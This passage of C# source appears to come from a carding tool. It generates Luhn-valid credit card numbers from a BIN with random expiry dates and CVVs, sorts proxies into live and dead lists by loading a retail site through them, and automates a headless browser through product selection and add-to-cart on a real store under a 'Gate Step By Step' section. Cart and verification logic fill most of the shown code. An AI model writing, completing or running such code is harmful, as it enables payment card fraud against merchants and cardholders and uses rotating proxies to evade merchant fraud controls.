            catch (Exception) { }
        }

        private async void IconButtonStop_Click(object sender, EventArgs e)
        {
            try
            {
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;

                await tokenCancel.Kill();
                await browser.Kill("www.brownells.com");

                await ConsoleProgressGeneral("Odin esta siendo Detenido.", 0, "Success");
                await ConsoleProgressDetail("Odin esta siendo Detenido.", 0, "Success");
                await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
                await ConsoleProgressDetail("ODIN PADRE DE TODO.", 0);
                IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
                IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.White;
                IconButtonValkyrie.Enabled = true;
                if (CreditCards != null)
                {
                    if (CreditCards.Count > 0)
                    {
                        IconButtonVerify.IconColor = Color.White;
                        IconButtonVerify.Enabled = true;

                    }
                    else
                    {
                        TextBoxCreditCards.Clear();
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                    }
                }
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region Panel Hellheim
        #region Panel Events
        private void PanelHellheim_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxHelheim = new Rectangle(TextBoxHelheim.Location.X, TextBoxHelheim.Location.Y, TextBoxHelheim.ClientSize.Width + 17, TextBoxHelheim.ClientSize.Height);
            borderTextBoxHelheim.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxHelheim, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Contols Events
        private void TextBoxHelheim_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountHellheim.Text = textBox.Lines.Count().ToString();
            }
            catch (Exception) { /*throw;*/ }
        }
        private void IconButtonClear_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            TextBoxBin.Clear();
            TextBoxBin.Placeholder("######xxxxxxxxxx");
            MaskedTextBoxDate.Clear();
            MaskedTextBoxDate.Placeholder("dd/aa");
            TextBoxCvv.Clear();
            TextBoxCvv.Placeholder(cvvDigits);
            TextBoxQuantity.Clear();
            TextBoxQuantity.Text = "10";
            TextBoxCreditCards.Text = string.Empty;
            TextBoxValhalla.Text = string.Empty;
            TextBoxHelheim.Text = string.Empty;
            IconButtonGenerar.IconColor = Color.Black;
            IconButtonGenerar.Enabled = false;
            IconButtonVerify.IconColor = Color.Black;
            IconButtonVerify.Enabled = false;
            LabelGetBin.Text = "-";
            LabelGetSchema.Text = "-";
            LabelGetType.Text = "-";
            LabelGetBrand.Text = "-";
            LabelGetBank.Text = "-";
            LabelGetCountry.Text = "-";
        }
        #endregion
        #endregion
        #endregion

        #region Generator Credit Cards
        #region Methods
        private async Task GenerateCreditCards()
        {
            tokenCancel = new CancellationTokenSource();
            CancellationToken token = tokenCancel.Token;

            //  await Task.Factory.StartNew(async () =>
            await Task.Run(async () =>
             {
                 if (!token.IsCancellationRequested)
                 {
                     string bin = TextBoxBin.Text.Replace("x", string.Empty).Replace("X", string.Empty);
                     string listCreditCard = string.Empty;
                     if (bin.Length >= 6)
                     {
                         Dictionary<int, int> precision = new Dictionary<int, int>();
                         RangeAndLength[] range = AllCards();
                         int rangeLength = range.Length;
                         for (int j = 0; j < rangeLength; j++)
                         {
                             string pattern = @"\b" + range[j].Range;
                             Match match = Regex.Match(bin, pattern);
                             if (match.Success)
                             {
                                 precision.Add(j, int.Parse(match.Value));
                             }
                         }
                         if (precision.Count > 0)
                         {
                             RangeAndLength card = range[precision.OrderByDescending(x => x.Value).First().Key];
                             int cardLenght = card.Length;
                             Quatity = TextBoxQuantity.Text;
                             int quantity = int.Parse(Quatity);
                             CreditCards = new List<List<string>>();
                             for (int i = 0; i < quantity; i++)
                             {
                                 double progress = Convert.ToDouble((i + 1) * 100 / quantity);
                                 await ConsoleProgressGeneral("Generando", (int)Math.Round(progress));
                                 CreditCards.Add(new List<string>());
                                 CreditCards[i].Add(CreateCardNumber(bin, cardLenght));
                                 CreditCards[i].Add(GetDate()[0]);
                                 CreditCards[i].Add(GetDate()[1]);
                                 CreditCards[i].Add(GetCvv());
                                 await Task.Delay(50);
                                 if (IconButtonGenerarStopClick)
                                 {
                                     IconButtonGenerarStopClick = false;
                                     await ConsoleProgressGeneral("¡Detenido!", 0, "Success");
                                     break;
                                 }
                             }

                             if (CreditCards.Count > 0)
                             {
                                 int creditCardsCount = CreditCards.Count;
                                 for (int i = 0; i < creditCardsCount; i++)
                                 {
                                     if (i != creditCardsCount - 1)
                                     {
                                         listCreditCard += string.Join("|", CreditCards[i].ToArray()) + "\r\n";
                                     }
                                     else
                                     {
                                         listCreditCard += string.Join("|", CreditCards[i].ToArray());
                                     }
                                 }
                             }
                         }
                     }
                     TextBoxCreditCards.Text = listCreditCard;
                 }
             }, token);
        }
        private static RangeAndLength[] AllCards()
        {
            return BuildRangeAndLengthList(rangeAmex, 15).
                Union(BuildRangeAndLengthList(rangeCUP, 16)).
                Union(BuildRangeAndLengthList(rangeDCCB, 14)).
                Union(BuildRangeAndLengthList(rangeDCI, 14)).
                Union(BuildRangeAndLengthList(rangeDCUSC, 16)).
                Union(BuildRangeAndLengthList(rangeDC, 14)).
                Union(BuildRangeAndLengthList(rangeInsP, 16)).
                Union(BuildRangeAndLengthList(rangeIntP, 16)).
                Union(BuildRangeAndLengthList(rangeJCB, 16)).
                Union(BuildRangeAndLengthList(rangeM, 16)).
                Union(BuildRangeAndLengthList(rangeMC, 16)).
                Union(BuildRangeAndLengthList(rangeUATP, 15)).
                Union(BuildRangeAndLengthList(rangeV, 16)).
                ToArray();
        }
        private static IEnumerable<RangeAndLength> BuildRangeAndLengthList(string[] rangeList, int length)
        {
            string[] x = GenerateRange(rangeList);
            return from range in x select new RangeAndLength(range, length);
        }
        private static string[] GenerateRange(string[] rangesList)
        {
            List<string> range = new List<string>();
            foreach (string rangeList in rangesList)
            {
                if (rangeList.Contains("-"))
                {
                    string[] ranges = rangeList.Split('-');
                    int start = int.Parse(ranges[0]);
                    int end = int.Parse(ranges[1]);

                    for (int i = start; i <= end; i++)
                    {
                        range.Add(i.ToString());
                    }
                }
                else
                {
                    range.Add(rangeList);
                }
            }
            return range.ToArray();
        }
        private struct RangeAndLength
        {
            public RangeAndLength(string range, int length)
            {
                Range = range;
                Length = length;
            }
            public string Range { get; set; }
            public int Length { get; set; }
        }
        private string CreateCardNumber(string bin, int binLenght)
        {
            Random random = new Random();
            string ccnumber = bin;
            while (ccnumber.Length < (binLenght - 1))
            {
                double rnd = (random.NextDouble() * 1.0f - 0f);
                ccnumber += Math.Floor(rnd * 10);
            }

            // reverse number and convert to int
            IEnumerable<char> reversedCCnumberstring = ccnumber.ToCharArray().Reverse();
            IEnumerable<int> reversedCCnumberList = reversedCCnumberstring.Select(c => Convert.ToInt32(c.ToString()));

            // calculate sum //Luhn Algorithm http://en.wikipedia.org/wiki/Luhn_algorithm
            int sum = 0;
            int pos = 0;
            int[] reversedCCnumber = reversedCCnumberList.ToArray();

            while (pos < binLenght - 1)
            {
                int odd = reversedCCnumber[pos] * 2;

                if (odd > 9)
                    odd -= 9;

                sum += odd;

                if (pos != (binLenght - 2))
                    sum += reversedCCnumber[pos + 1];

                pos += 2;
            }

            // calculate check digit
            int checkdigit = Convert.ToInt32((Math.Floor((decimal)sum / 10) + 1) * 10 - sum) % 10;
            ccnumber += checkdigit;
            return ccnumber;
        }
        private List<string> GetDate()
        {
            List<string> date = new List<string>();
            if (MaskedTextBoxDate.Text != "dd/aa")
            {
                string[] split = MaskedTextBoxDate.Text.Split('/');
                date.Add(split[0]);
                date.Add("20" + split[1]);
            }
            else
            {
                date.Add(new Random().Next(1, 12).ToString("00"));
                date.Add("20" + new Random().Next(20, 29).ToString());
            }
            return date;
        }
        private string GetCvv()
        {
            string cvv;
            if (TextBoxCvv.Text == cvvDigits)
            {
                if (TextBoxCvv.MaxLength == 4)
                {
                    cvv = new Random().Next(1, 9999).ToString("0000");
                }
                else
                {
                    cvv = new Random().Next(1, 999).ToString("000");
                }
            }
            else
            {
                cvv = TextBoxCvv.Text;
            }
            return cvv;
        }

        #endregion
        #endregion

        #region Valkyrie
        #region Panel Valkyrie
        #region Panel Events
        private void PanelValkyrie_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrie = new Rectangle(TextBoxValkyrie.Location.X, TextBoxValkyrie.Location.Y, TextBoxValkyrie.ClientSize.Width + 17, TextBoxValkyrie.ClientSize.Height);
            borderTextBoxValkyrie.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrie, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Contols Events
        private void TextBoxValkyrie_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            try
            {
                LabelCountValkyrie.Text = textBox.Lines.Count().ToString();
                string valkyries = textBox.Text.Trim();

                if (ModifierKeys.HasFlag(Keys.Control))
                {
                    if (valkyries.Contains("\r\n"))
                    {
                        string[] listValkyries = valkyries.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                        int listValkyriesLength = listValkyries.Length;
                        Valkyries = new List<List<string>>();
                        for (int i = 0; i < listValkyriesLength; i++)
                        {
                            string[] listValkyrie = listValkyries[i].Split('|');
                            Valkyries.Add(new List<string>());
                            Valkyries[i].Add(listValkyrie[0]);
                            Valkyries[i].Add(listValkyrie[1]);
                            Valkyries[i].Add(listValkyrie[2]);
                        }

                        if (!IconButtonValkyrieVerifyClick)
                        {
                            IconButtonValkyrieVerify.IconColor = Color.White;
                            IconButtonValkyrieVerify.Enabled = true;
                            IconButtonValkyrieClear.IconColor = Color.White;
                            IconButtonValkyrieClear.Enabled = true;
                        }
                    }
                    else if (valkyries.Contains("|"))
                    {
                        Valkyries = new List<List<string>>();
                        string[] listValkyrie = valkyries.Split('|');
                        Valkyries.Add(new List<string>());
                        Valkyries[0].Add(listValkyrie[0]);
                        Valkyries[0].Add(listValkyrie[1]);
                        Valkyries[0].Add(listValkyrie[2]);
                        if (!IconButtonValkyrieVerifyClick)
                        {
                            IconButtonValkyrieVerify.IconColor = Color.White;
                            IconButtonValkyrieVerify.Enabled = true;
                            IconButtonValkyrieClear.IconColor = Color.White;
                            IconButtonValkyrieClear.Enabled = true;
                        }
                    }
                    else
                    {
                        textBox.Text = string.Empty;
                    }
                }
                else
                {
                    if (valkyries == string.Empty)
                    {
                        textBox.Text = string.Empty;
                        IconButtonVerify.IconColor = Color.Black;
                        IconButtonVerify.Enabled = false;
                        if (TextBoxValkyrieLive.Text == string.Empty && TextBoxValkyrieDie.Text == string.Empty)
                        {
                            IconButtonClear.IconColor = Color.Black;
                            IconButtonClear.Enabled = false;
                        }
                    }
                }
            }
            catch (Exception)
            {
                textBox.Text = string.Empty;
            }
        }

        private async void IconButtonValkyrieVerify_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;
            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;
            IconButtonValkyrieClear.IconColor = Color.Black;
            IconButtonValkyrieClear.Enabled = false;
            IconButtonValkyrie.IconColor = Color.Black;
            IconButtonValkyrie.Enabled = false;
            IconButtonValkyrieVerifyClick = true;
            IconButtonValkyrieStop.Enabled = true;
            IconButtonValkyrieStop.IconColor = Color.White;
            IconButtonValkyrieStop.Show();
            await InvokeValkyrie();
            await ConsoleProgressGeneral("Finalizo llamado a Valquirias.", 100, "Success");
            await ConsoleProgressDetail("Finalizo llamado a Valquirias.", 100, "Success");
            await ConsoleProgressGeneral("VALQUIRIAS (PROXYS).", 0);
            await ConsoleProgressDetail("VALQUIRIAS (PROXYS).", 0);
            IconButtonValkyrieClear.IconColor = Color.White;
            IconButtonValkyrieClear.Enabled = true;
            if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
            {
                if (TextBoxValkyrieLive.Lines.Count() > 0)
                {
                    IconButtonValkyrieStart.IconColor = Color.White;
                    IconButtonValkyrieStart.Enabled = true;
                    IconButtonValkyrie.IconColor = Color.White;
                    IconButtonValkyrie.Enabled = true;
                }
            }
            IconButtonValkyrieVerifyClick = false;
            IconButtonValkyrieStop.Hide();
        }
        #endregion
        #endregion
        #region Panel Valkyrie Live
        #region Panel events
        private void PanelValkyrieLive_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrieLive = new Rectangle(TextBoxValkyrieLive.Location.X, TextBoxValkyrieLive.Location.Y, TextBoxValkyrieLive.ClientSize.Width + 17, TextBoxValkyrieLive.ClientSize.Height);
            borderTextBoxValkyrieLive.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieLive, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Controls Events
        private void TextBoxValkyrieLive_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            LabelCountValkyrieLive.Text = textBox.Lines.Count().ToString();
            Valkyrie.Play();
        }

        private void IconButtonValkyrieStart_Click(object sender, EventArgs e)
        {
            try
            {
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;
                string valkyries = TextBoxValkyrieLive.Text.Trim();
                if (valkyries.Contains("\r\n"))
                {
                    string[] listValkyries = valkyries.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                    int listValkyriesLength = listValkyries.Length;
                    LiveValkyries = new List<List<string>>();
                    for (int i = 0; i < listValkyriesLength; i++)
                    {
                        string[] listValkyrie = listValkyries[i].Split('|');
                        LiveValkyries.Add(new List<string>());
                        LiveValkyries[i].Add(listValkyrie[0] + "://" + listValkyrie[1] + ":" + listValkyrie[2]);
                    }
                }
                else if (valkyries.Contains("|"))
                {
                    LiveValkyries = new List<List<string>>();
                    string[] listValkyrie = valkyries.Split('|');
                    LiveValkyries.Add(new List<string>());
                    LiveValkyries[0].Add(listValkyrie[0] + "://" + listValkyrie[1] + ":" + listValkyrie[2]);
                }

            }
            catch (Exception) { }
            IconButtonGenerar.IconColor = IconButtonGenerarIconColor;
            IconButtonGenerar.Enabled = IconButtonGenerarEnabled;
            PanelValkyrie.Hide();
            PanelValkyrieLive.Hide();
            PanelValkyrieDie.Hide();
            ShowPanelValkyrie = false;
        }

        private async void IconButtonValkyrieStop_Click(object sender, EventArgs e)
        {
            try
            {
                IconButton iconButton = (IconButton)sender;
                iconButton.IconColor = Color.Black;
                iconButton.Enabled = false;

                await tokenCancel.Kill();
                await browser.Kill("www.brownells.com");

                await ConsoleProgressGeneral("Valquirias estan siendo Detenidas.", 0, "Success");
                await ConsoleProgressDetail("Valquirias estan siendo Detenidas.", 0, "Success");
                await ConsoleProgressGeneral("VALQUIRIAS (PROXYS)", 0);
                await ConsoleProgressDetail("VALQUIRIAS (PROXYS)", 0);

                IconButtonValkyrieClear.IconColor = Color.White;
                IconButtonValkyrieClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.White;
                IconButtonValkyrie.Enabled = true;
                if (Valkyries.Count > 0)
                {
                    IconButtonValkyrieVerify.IconColor = Color.White;
                    IconButtonValkyrieVerify.Enabled = true;
                }

                if (!string.IsNullOrEmpty(TextBoxValkyrieLive.Text))
                {
                    if (TextBoxValkyrieLive.Lines.Count() > 0)
                    {
                        IconButtonValkyrieStart.IconColor = Color.White;
                        IconButtonValkyrieStart.Enabled = true;
                        IconButtonValkyrie.IconColor = Color.White;
                        IconButtonValkyrie.Enabled = true;
                    }
                }
                iconButton.Hide();
            }
            catch (Exception) { }
        }
        #endregion
        #endregion
        #region  Panel Valkyrie Die
        #region Panel events
        private void PanelValkyrieDie_Paint(object sender, PaintEventArgs e)
        {
            Rectangle borderTextBoxValkyrieDie = new Rectangle(TextBoxValkyrieDie.Location.X, TextBoxValkyrieDie.Location.Y, TextBoxValkyrieDie.ClientSize.Width + 17, TextBoxValkyrieDie.ClientSize.Height);
            borderTextBoxValkyrieDie.Inflate(1, 1); // border thickness
            ControlPaint.DrawBorder(e.Graphics, borderTextBoxValkyrieDie, Color.White, ButtonBorderStyle.Solid);
        }
        #endregion
        #region Controls Events
        private void TextBoxValkyrieDie_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            LabelCountValkyrieDie.Text = textBox.Lines.Count().ToString();
        }
        private void IconButtonValkyrieClear_Click(object sender, EventArgs e)
        {
            IconButton iconButton = (IconButton)sender;

            iconButton.IconColor = Color.Black;
            iconButton.Enabled = false;
            IconButtonValkyrieVerify.IconColor = Color.Black;
            IconButtonValkyrieVerify.Enabled = false;
            IconButtonValkyrieStart.IconColor = Color.Black;
            IconButtonValkyrieStart.Enabled = false;

            TextBoxValkyrie.Text = string.Empty;
            TextBoxValkyrieLive.Text = string.Empty;
            TextBoxValkyrieDie.Text = string.Empty;

            if (Valkyries != null && Valkyries.Count > 0)
            {
                Valkyries.Clear();
            }

            if (LiveValkyries != null && LiveValkyries.Count > 0)
            {
                LiveValkyries.Clear();
            }
        }
        #endregion
        #endregion
        #region Methods
        private async Task InvokeValkyrie()
        {
            try
            {
                string listValkyrieLive = string.Empty;
                string listValkyrieDie = string.Empty;
                int valkyriesCount = Valkyries.Count;
                await ConsoleProgressGeneral("Odin hace llamado a Valquirias.", 0);
                int x = 0;
                for (int i = 0; i < valkyriesCount;)
                {
                    string proxy = Valkyries[i][0] + "://" + Valkyries[i][1] + ":" + Valkyries[i][2];
                    bool odinVerifyValkyrie = await OdinVerifyValkyrie(proxy);
                    if (odinVerifyValkyrie)
                    {
                        if (TextBoxValkyrieLive.Text == string.Empty)
                        {
                            listValkyrieLive += string.Join("|", Valkyries[i].ToArray());
                        }
                        else
                        {
                            listValkyrieLive = TextBoxValkyrieLive.Text;
                            listValkyrieLive += "\r\n" + string.Join("|", Valkyries[i].ToArray());
                        }
                        await ReduceListValkyrie();
                        TextBoxValkyrieLive.Text = listValkyrieLive;
                        double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                        await ConsoleProgressGeneral("Odin llamando a Valquirias.", (int)Math.Round(progress));
                    }
                    else
                    {
                        if (TextBoxValkyrieDie.Text == string.Empty)
                        {
                            listValkyrieDie += string.Join("|", Valkyries[i].ToArray());
                        }
                        else
                        {
                            listValkyrieDie = TextBoxValkyrieDie.Text;
                            listValkyrieDie += "\r\n" + string.Join("|", Valkyries[i].ToArray());
                        }
                        await ReduceListValkyrie();
                        TextBoxValkyrieDie.Text = listValkyrieDie;
                        double progress = Convert.ToDouble((x + 1) * 100 / valkyriesCount);
                        await ConsoleProgressGeneral("Odin llamando a Valquirias.", (int)Math.Round(progress));
                    }
                    await Task.Delay(50);
                    x++;

                }
            }
            catch (Exception) { }
        }
        private async Task<bool> OdinVerifyValkyrie(string proxy)
        {
            bool odin = false;
            try
            {
                browser = new ChromiumWebBrowser();
                await Task.Delay(500);
                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;
                await ConsoleProgressDetail("Valquirias preparadas.", 0);
                await Task.Run(async () =>
                {
                    await ConsoleProgressDetail("Valquirias preparadas.", 20);
                    if (!token.IsCancellationRequested)
                    {
                        bool loadPage = await browser.LoadPage(initialUrl, proxy);
                        await ConsoleProgressDetail("Analizando Valquiria. " + proxy, 40);
                        await Task.Delay(500);

                        if (loadPage)
                        {
                            bool startOdinValkyrie = await StartOdinValkyrie();
                            if (startOdinValkyrie)
                            {
                                await ConsoleProgressDetail("Valquiria. " + proxy, 100, "Success");
                                odin = true;
                            }
                            else
                            {
                                await ConsoleProgressDetail("Valquiria. " + proxy, 100, "Fail");
                                odin = false;
                            }
                        }
                        else
                        {
                            await OdinVerifyValkyrie(proxy);
                        }
                    }
                    else
                    {
                        odin = false;
                    }
                }, token);
            }
            catch (Exception) { }
            return odin;
        }

        private async Task<bool> StartOdinValkyrie()
        {
            try
            {
                await ConsoleProgressDetail("Estado de Valquiria.", 80);
                if (await browser.ElementVisible("#dropSortBy", "ExceptionStartOdinValkyrie"))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception) { }
            return false;
        }
        private async Task ReduceListValkyrie()
        {
            try
            {
                Valkyries.RemoveAt(0);
                string listValkyries = string.Empty;
                int ValkyriesCount = Valkyries.Count;
                for (int i = 0; i < ValkyriesCount; i++)
                {
                    if (Valkyries.Count > 0)
                    {
                        if (i < Valkyries.Count - 1)
                        {
                            listValkyries += string.Join("|", Valkyries[i].ToArray()) + "\r\n";
                        }
                        else
                        {
                            listValkyries += string.Join("|", Valkyries[i].ToArray());
                        }
                    }
                    else
                    {
                        listValkyries = string.Empty;
                    }
                    await Task.Delay(50);
                }
                TextBoxValkyrie.Text = listValkyries;
            }

            catch (Exception) { }
        }
        #endregion
        #endregion

        #region Web Browser
        #region Load Browser
        private async Task InvokeOdin()
        {
            bool odin = false;
            try
            {
                await ConsoleProgressGeneral("Invocando a Odin.", 0);

                browser = new ChromiumWebBrowser();
                await Task.Delay(500);

                tokenCancel = new CancellationTokenSource();
                CancellationToken token = tokenCancel.Token;

                odin = await Task<bool>.Run(async () =>
                {
                    if (!token.IsCancellationRequested)
                    {
                        return await LoadBrowser();
                    }
                    else
                    {
                        return false;
                    }
                }, token);
            }
            catch (Exception) { }

            await browser.Kill(web);
            //await browser.Kill("www.shoebacca.com");
            await tokenCancel.Kill();

            if (odin)
            {
                await ConsoleProgressGeneral("Odin finalizo los procesos correctamente.", 100, "Success");
                IconButtonClear.IconColor = Color.White;
                IconButtonClear.Enabled = true;
                IconButtonValkyrie.IconColor = Color.White;
                IconButtonValkyrie.Enabled = true;
            }
            else
            {
                if (CreditCards.Count > 0)
                {
                    await ConsoleProgressGeneral("Odin requiere un sacrificio.", 0, "Fail");
                    await ConsoleProgressGeneral("Ofreciendo un sacrificio a Odin.", 0, "Success");
                    await InvokeOdin();
                }
                else
                {
                    await ConsoleProgressGeneral("Odin encontro un elfo oscuro y se detuvo.", 0, "Fail");
                }
            }
            await Task.Delay(2000);
            await ConsoleProgressGeneral("ODIN PADRE DE TODO.", 0);
            await ConsoleProgressDetail("", 0);
        }

        private async Task<bool> LoadBrowser()
        {
            bool loadBrowser = false;
            try
            {
                await ConsoleProgressGeneral("Invocando a Odin..", 2);
                string url = initialUrl + middleInitialUrl[new Random().Next(0, middleInitialUrl.Length)] + lastInitialUrl;
                if (LiveValkyries != null)
                {
                    if (LiveValkyries.Count > 0)
                    {
                        List<string> proxy = LiveValkyries.OrderBy(x => Guid.NewGuid()).FirstOrDefault();
                        await ConsoleProgressGeneral("Valquiria: " + proxy[0], 2);
                        loadBrowser = await browser.LoadPage(url, proxy[0]);
                    }
                    else
                    {
                        loadBrowser = await browser.LoadPage(url);
                    }
                }
                else
                {
                    loadBrowser = await browser.LoadPage(url);
                }
            }
            catch (Exception) { }

            await Task.Delay(500);
            if (loadBrowser)
            {
                return await LoadPage();
            }

            await ConsoleProgressGeneral("Invocando a Odin.. ¡Fallo!", 2, "Fail");
            return false;

        }

        private async Task<bool> LoadPage()
        {

            try
            {
                await ConsoleProgressGeneral("Invocando a Odin...", 3);
                return await StartOdin();
            }
            catch (Exception) { }

            await ConsoleProgressGeneral("Invocando a Odin... ¡Fallo!", 0, "Fail");
            return false;

        }
        #endregion

        #region  Gate Step By Step
        private async Task<bool> StartOdin()
        {
            try
            {
                await ConsoleProgressGeneral("Insertando algoritmos de extensión.", 10);
                await browser.DisableAlerts();
            }
            catch (Exception) { }

            bool spanCartNumber = await browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "1.ExceptionStartOdinCart");
            if (spanCartNumber)
            {
                return await Cart();
            }

            bool anchorItem = await browser.ElementVisible("#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li:nth-child(1) > a", "1.ExceptionStartOdin");
            if (anchorItem)
            {
                await browser.Screenshot("1.Load");
                return await Item();
            }
            else
            {
                //MessageBox.Show("Recaptcha");
                await browser.SoftKill();
                await tokenCancel.Kill();
                await InvokeOdin();
            }

            await ConsoleProgressGeneral("Insertando algoritmos de extensión. ¡Fallo!", 10, "Fail");
            return false;

        }

        private async Task<bool> Item()
        {
            try
            {
                await browser.Screenshot("2.Item");
                await ConsoleProgressGeneral("Reubicando atributos influenciables.", 20);
                await browser.DisableAlerts();
                string clickItemInStock = @"let allItems = document.querySelectorAll('#root > main > div:nth-child(4) > section > div > div.ais-InfiniteHits > ul > li > a');
                    let randItem = allItems[Math.floor(Math.random() * allItems.length)];
                    randItem.click();";
                await browser.ExecuteScript(clickItemInStock);
            }
            catch (Exception) { }
            bool buttonSizeSelected = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button.tile-root_selected-1uw", "2.1.ExceptionItemSizeSelected");
            if (buttonSizeSelected)
            {
                return await AddToCart();
            }
            else
            {   //#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button:nth-child(2)
                //#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button
                bool buttonSize = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button", "2.2.ExceptionItemSelectSize");
                if (buttonSize)
                {
                    return await SelectSize();
                }
                else
                {
                    bool buttonSizeOnlySelected = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button.tile-root_selected-1uw", "2.1.ExceptionItemSizeOnlySelected");
                    if (buttonSizeOnlySelected)
                    {
                        await browser.Screenshot("2.Item");
                        return await AddToCart();
                    }
                    else
                    {                                                     //#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button:nth-child(1)
                        bool buttonSizeOnly = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button", "2.1.ExceptionItemSizeOnly");
                        if (buttonSizeOnly)
                        {
                            return await SelectSizeOnly();
                        }

                    }
                }

            }
            await ConsoleProgressGeneral("Reubicando atributos influenciables. ¡Fallo!", 20, "Fail");
            return false;
        }



        private async Task<bool> SelectSizeOnly()
        {
            try
            {
                await browser.Screenshot("3.SelectSizeOnly");
                await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica.", 25);
                await browser.DisableAlerts();

                string clickSize = @"let allSizes = document.querySelectorAll('#productFullDetail > div.productFullDetail-options-ziU > div > div > div > button:not([disabled])');
                    let randSize = allSizes[Math.floor(Math.random() * allSizes.length)];
                    randSize.click();";
                await browser.ExecuteScript(clickSize);
            }
            catch (Exception) { }

            bool buttonAddToCart = await browser.ElementVisible("#productFullDetail > div.productFullDetail-cartActions-Uw6 > button", "3.ExceptionSelectWidth");
            if (buttonAddToCart)
            {
                return await AddToCart();
            }

            await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica. ¡!", 25, "Fail");
            return false;

        }

        private async Task<bool> SelectSize()
        {
            try
            {
                await browser.Screenshot("3.SelectSize");
                await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica.", 25);
                await browser.DisableAlerts();

                string clickSize = @"let allSizes = document.querySelectorAll('#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(2) > div > div > button:not([disabled])');
                    let randSize = allSizes[Math.floor(Math.random() * allSizes.length)];
                    randSize.click();";
                await browser.ExecuteScript(clickSize);
            }
            catch (Exception) { }
            //

            bool buttonWidthSelected = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(1) > div > div > button.tile-root_selected-1uw", "3.1.ExceptionSelectSizeSelectedWidth");
            if (buttonWidthSelected)
            {
                return await AddToCart();
            }
            else
            {
                bool buttonWidth = await browser.ElementVisible("#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(1) > div > div > button", "3.2.ExceptionSelectSize");
                if (buttonWidth)
                {
                    return await SelectWidth();
                }
            }

            await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica. ¡!", 25, "Fail");
            return false;
        }

        private async Task<bool> SelectWidth()
        {
            try
            {
                await browser.Screenshot("3.SelectWidth");
                await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica.", 27);
                await browser.DisableAlerts();

                string clickSize = @"let allWidths = document.querySelectorAll('#productFullDetail > div.productFullDetail-options-ziU > div:nth-child(1) > div > div > button:not([disabled])');
                    let randWidth = allWidths[Math.floor(Math.random() * allWidths.length)];
                    randWidth.click();";
                await browser.ExecuteScript(clickSize);
            }
            catch (Exception) { }

            bool buttonAddToCart = await browser.ElementVisible("#productFullDetail > div.productFullDetail-cartActions-Uw6 > button", "3.ExceptionSelectWidth");
            if (buttonAddToCart)
            {
                return await AddToCart();
            }

            await ConsoleProgressGeneral("Importando anclajes de desprogramación séctica. ¡!", 27, "Fail");
            return false;
        }

        private async Task<bool> AddToCart()
        {

            try
            {
                await browser.Screenshot("4.AddToCart");
                await ConsoleProgressGeneral("Trazando retícula de Splines.", 30);
                await browser.DisableAlerts();
                string clickAddToCart = @"document.querySelector('#productFullDetail > div.productFullDetail-cartActions-Uw6 > button').click();";
                await browser.ExecuteScript(clickAddToCart);

            }
            catch (Exception) { }

            bool spanCartNumber = await browser.ElementInnerTextEquals("#root > main > header > div > div.header-desktopSecondaryActions-n-W > div:nth-child(5) > div > button > span", "1", "4.ExceptionAddToCart");
            if (spanCartNumber)
            {
                return await Cart();
            }

            await ConsoleProgressGeneral("Trazando retícula de Splines. ¡Fallo!", 30, "Fail");
            return false;
        }

        //private async Task<bool> ViewCart()
        //{

        //    try
        //    {
